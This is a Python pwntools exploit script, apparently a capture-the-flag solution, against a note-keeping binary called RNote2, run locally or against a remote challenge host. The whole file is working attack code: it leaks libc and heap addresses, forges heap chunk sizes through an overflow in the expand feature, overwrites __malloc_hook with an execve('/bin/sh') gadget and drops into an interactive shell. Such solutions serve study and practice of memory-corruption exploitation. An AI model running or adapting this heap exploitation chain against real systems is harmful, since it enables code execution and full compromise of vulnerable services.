from pwn import *
import time, sys


# local process envirnoment
LOCAL = True
elf_name = "./RNote2"

#retmote args
remote_host = "115.28.185.220"
remote_port = 22222
context.clear(arch="amd64")
elf = ELF(elf_name)

if LOCAL:
    # 7FB281CE0B10 7FB281CE0B78 7fb28191d000
    smlbin_area_off = 0x3C3B78
    execv_binsh_off = 0xF0567
    malloc_hook_off = 0x3C3B10
    #context.log_level = "debug"
    mine_env = os.environ
    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86_64-linux-gnu/dealarm.so"
    io = process(elf_name, env=mine_env)
else:
    printf_off = 0x4CDD0
    system_off = 0x3FE70
    io = remote(remote_host, remote_port)

def dlySend(sdstr):
    io.send(sdstr)
    time.sleep(0.05)

def mmenu(opt):
    io.recvuntil("Your choice:")
    io.sendline(str(opt))

def add_note(size, mcontent):
    mmenu(1)
    io.recvuntil("Input the note length:")
    io.sendline(str(size))
    io.recvuntil("Input the note content:")
    dlySend(mcontent)

def delete_note(mindex):
    mmenu(2)
    io.recvuntil("Which note do you want to delete?")
    io.sendline(str(mindex))

def list_note():
    mmenu(3)
    io.recvuntil("Your all notes:")

def edit_note(mindex, mcontent):
    mmenu(4)
    io.recvuntil("Which note do you want to edit?")
    io.sendline(str(mindex))
    io.recvuntil("Input new content:")
    dlySend(mcontent)

def expand_note(mindex, size, mcontent):
    mmenu(5)
    io.recvuntil("Which note do you want to expand?")
    io.sendline(str(mindex))
    io.recvuntil("How long do you want to expand?")
    io.sendline(str(size))
    io.recvuntil("Input content you want to expand")
    dlySend(mcontent)

def exit_rnote():
    mmenu(6)

def s_leak():
    libc_base_addr = 0
    add_note(0xf8, 'l'*0xf0+'\n')   # 0
    add_note(0xf8, 'k'*0xf0+'\n')   # 1
    delete_note(1)
    payload = 'e'*0x07+'\n'
    add_note(0xf8, payload)
    list_note()
    io.recvuntil(payload)
    data = io.recvuntil('\n')[:-1]
    # main_arena = (u64(p.recv(6).ljust(8, '\x00')) & 0xfffffffffff00) + 0x20
    libc_base_addr = u64(data.ljust(0x08, chr(0))) - smlbin_area_off
    main_arena_addr = (libc_base_addr+smlbin_area_off) & 0xfffffffffff00 + 0x20
    log.info("lib main arena addr: "+hex(main_arena_addr))
    delete_note(1)
    delete_note(1)
    return libc_base_addr

def lk_heap():
    heap_addr = 0
    payload = 'c'*0x0F+'\n'
    add_note(0x20, payload)     # 0
    list_note()
    io.recvuntil(payload)
    data = io.recvuntil('\n')[:-1]
    heap_addr = u64(data.ljust(0x08, chr(0))) - 0x10
    return heap_addr

def s_exp():
    libc_base_addr = s_leak()
    heap_addr = lk_heap()
    log.info("libc address: "+hex(libc_base_addr))
    log.info("heap address: "+hex(heap_addr))
    for i in range(5):
        add_note(0xf8, chr(0x61+i)*0xf0+'\n')

    add_note(0x10, 'v' * 0x10)
    add_note(0x18, 'a' * 0x18)      # 8
    add_note(0x100, 'f' * 0x100)    # 9
    add_note(0x20, '\x01' * 0x20)   # 10->9

    delete_note(9)
    add_note(0x30, '/bin/sh\x00\n')     # 10
    fake_scc = chr(1) * (0x7) + p64(0xd1)[:3] + '\n'
    expand_note(8, 0xb0, fake_scc)

    add_note(0x30, 'o' * 0x30)          # 11->10
    delete_note(9)

    payload = 'e'*0x50
    payload += p64(0) + p64(0x31)
    payload += p64(0) + p64(0x30)
    payload += p64(0)*2
    payload += p64(libc_base_addr+malloc_hook_off) + '\n'
    add_note(0x90, payload)             # 11
    pause()
    edit_note(10, p64(libc_base_addr+execv_binsh_off)+'\n')
    mmenu(1)
    io.recvuntil("Input the note length:")
    io.sendline(str(0x20))
    io.interactive()

if __name__ == "__main__":
    s_exp()
    pause()
